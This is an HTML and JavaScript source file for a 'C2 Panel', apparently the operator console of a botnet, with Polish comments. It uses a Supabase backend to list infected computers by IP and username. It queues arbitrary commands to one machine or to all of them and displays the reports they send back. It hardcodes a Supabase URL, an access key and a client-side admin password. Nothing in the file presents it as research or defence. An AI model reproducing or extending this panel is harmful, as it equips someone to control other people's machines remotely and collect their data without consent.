<!DOCTYPE html>
<html>
<head>
    <title>C2 Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: #00ff00; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .login-box { max-width: 400px; margin: 100px auto; background: #1a1a1a; padding: 30px; border-radius: 10px; text-align: center; }
        .login-box input, .login-box button { width: 100%; padding: 10px; margin: 10px 0; background: #333; color: #fff; border: none; }
        .login-box button { background: #00ff00; color: #000; cursor: pointer; }
        .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; margin-top: 20px; }
        .computer-card { background: #1a1a1a; border-radius: 10px; padding: 15px; border-left: 4px solid #00ff00; cursor: pointer; }
        .computer-card.offline { border-left-color: #ff0000; opacity: 0.6; }
        .computer-name { font-size: 18px; font-weight: bold; }
        .computer-ip { color: #888; font-size: 12px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
        .modal-content { background: #1a1a1a; margin: 5% auto; padding: 20px; width: 80%; max-width: 800px; border-radius: 10px; }
        .close { float: right; cursor: pointer; font-size: 28px; color: #ff0000; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab { padding: 8px 16px; background: #333; cursor: pointer; border-radius: 5px; }
        .tab.active { background: #00ff00; color: #000; }
        pre { background: #000; padding: 10px; overflow-x: auto; font-size: 12px; }
        textarea { width: 100%; background: #333; color: #fff; border: none; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
<div class="container">
    <div id="loginSection" class="login-box">
        <h2>C2 ADMIN LOGIN</h2>
        <input type="password" id="passwordInput" placeholder="Hasło">
        <button id="loginBtn">Login</button>
    </div>
    
    <div id="mainSection" style="display:none;">
        <h1>C2 COMMAND AND CONTROL</h1>
        <div class="tabs">
            <div class="tab active" data-tab="computers">COMPUTERS</div>
            <div class="tab" data-tab="commands">COMMANDS</div>
            <div class="tab" data-tab="reports">REPORTS</div>
        </div>
        
        <div id="computersTab">
            <div class="computers-grid" id="computersList">Loading...</div>
        </div>
        
        <div id="commandsTab" style="display:none;">
            <select id="targetComputer">
                <option value="all">ALL COMPUTERS</option>
            </select>
            <textarea id="commandInput" rows="3" placeholder="Enter command..."></textarea>
            <button id="sendCmdBtn">SEND</button>
            <pre id="commandResults">No commands</pre>
        </div>
        
        <div id="reportsTab" style="display:none;">
            <pre id="reportsContent">No reports</pre>
        </div>
    </div>
</div>

<div id="computerModal" class="modal">
    <div class="modal-content">
        <span class="close" id="closeModalBtn">&times;</span>
        <div id="modalContent"></div>
    </div>
</div>

<script>
    (function() {
        // ==========================================
        // KONFIGURACJA SUPABASE
        // ==========================================
        const SUPABASE_URL = "https://suipfydwvakzyxodycqm.supabase.co";
        const SUPABASE_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
        const ADMIN_PASSWORD = "08319752026";
        
        let supabase = null;
        let currentComputerId = null;
        
        // ==========================================
        // FUNKCJE
        // ==========================================
        async function loadComputers() {
            if (!supabase) return;
            
            const { data, error } = await supabase.from('computers').select('*').order('last_seen', {ascending: false});
            if (error) {
                document.getElementById('computersList').innerHTML = '<div style="padding:20px;">Błąd bazy. Sprawdź Supabase.</div>';
                return;
            }
            
            const container = document.getElementById('computersList');
            if (!data || data.length === 0) {
                container.innerHTML = '<div style="padding:20px;">Brak komputerów. Agent nie uruchomiony.</div>';
                return;
            }
            
            container.innerHTML = '';
            data.forEach(comp => {
                const lastSeen = new Date(comp.last_seen);
                const isOnline = (Date.now() - lastSeen) < 120000;
                
                const card = document.createElement('div');
                card.className = `computer-card ${isOnline ? 'online' : 'offline'}`;
                card.onclick = () => showComputerDetails(comp);
                card.innerHTML = `
                    <div class="computer-name">${isOnline ? '●' : '○'} ${comp.name}</div>
                    <div class="computer-ip">IP: ${comp.ip || 'N/A'} | User: ${comp.username || 'N/A'}</div>
                    <div class="computer-ip">Last: ${lastSeen.toLocaleString()}</div>
                `;
                container.appendChild(card);
                
                // Update dropdown
                const select = document.getElementById('targetComputer');
                if (select && !select.querySelector(`option[value="${comp.id}"]`)) {
                    select.innerHTML += `<option value="${comp.id}">${comp.name} (${comp.ip})</option>`;
                }
            });
        }
        
        async function showComputerDetails(computer) {
            currentComputerId = computer.id;
            const modal = document.getElementById('computerModal');
            const content = document.getElementById('modalContent');
            
            // Get recent reports
            const { data: reports } = await supabase.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(10);
            
            content.innerHTML = `
                <h2>${computer.name}</h2>
                <p>IP: ${computer.ip} | User: ${computer.username} | OS: ${computer.os || 'Windows'}</p>
                <h3>Recent Reports</h3>
                <pre>${JSON.stringify(reports, null, 2)}</pre>
                <h3>Send Command</h3>
                <textarea id="singleCommand" rows="3" style="width:100%"></textarea>
                <button id="sendSingleBtn">Send</button>
                <div id="cmdResult"></div>
            `;
            
            document.getElementById('sendSingleBtn').onclick = async () => {
                const cmd = document.getElementById('singleCommand').value;
                if (!cmd) return;
                const { error } = await supabase.from('commands').insert({
                    computer_id: currentComputerId,
                    command: cmd,
                    status: 'pending'
                });
                document.getElementById('cmdResult').innerHTML = error ? 'Error: ' + error.message : 'Command sent!';
            };
            modal.style.display = 'block';
        }
        
        async function sendCommandToAll() {
            const cmd = document.getElementById('commandInput').value;
            if (!cmd) return;
            
            const { data: computers } = await supabase.from('computers').select('id');
            for (const comp of computers) {
                await supabase.from('commands').insert({
                    computer_id: comp.id,
                    command: cmd,
                    status: 'pending'
                });
            }
            alert(`Command sent to ${computers.length} computers`);
            loadCommands();
        }
        
        async function loadReports() {
            if (!supabase) return;
            const { data } = await supabase.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
            document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'No reports';
        }
        
        async function loadCommands() {
            if (!supabase) return;
            const { data } = await supabase.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
            document.getElementById('commandResults').innerHTML = data ? JSON.stringify(data, null, 2) : 'No commands';
        }
        
        function showTab(tabName) {
            document.getElementById('computersTab').style.display = tabName === 'computers' ? 'block' : 'none';
            document.getElementById('commandsTab').style.display = tabName === 'commands' ? 'block' : 'none';
            document.getElementById('reportsTab').style.display = tabName === 'reports' ? 'block' : 'none';
            
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.toggle('active', tab.dataset.tab === tabName);
            });
            
            if (tabName === 'commands') loadCommands();
            if (tabName === 'reports') loadReports();
        }
        
        function closeModal() {
            document.getElementById('computerModal').style.display = 'none';
        }
        
        // ==========================================
        // INICJALIZACJA - ŁADOWANIE SUPABASE
        // ==========================================
        async function init() {
            // Dynamically load Supabase library
            return new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
                script.onload = () => {
                    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
                    resolve();
                };
                script.onerror = () => reject('Failed to load Supabase');
                document.head.appendChild(script);
            });
        }
        
        // Login button
        document.getElementById('loginBtn').onclick = async () => {
            const pwd = document.getElementById('passwordInput').value;
            if (pwd === ADMIN_PASSWORD) {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('mainSection').style.display = 'block';
                
                try {
                    await init();
                    await loadComputers();
                    setInterval(loadComputers, 30000);
                } catch(e) {
                    document.getElementById('computersList').innerHTML = '<div style="padding:20px;color:red;">Błąd ładowania Supabase. Sprawdź internet.</div>';
                }
            } else {
                alert('Wrong password!');
            }
        };
        
        document.getElementById('sendCmdBtn').onclick = sendCommandToAll;
        document.getElementById('closeModalBtn').onclick = closeModal;
        
        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => showTab(tab.dataset.tab);
        });
    })();
</script>
</body>
</html>
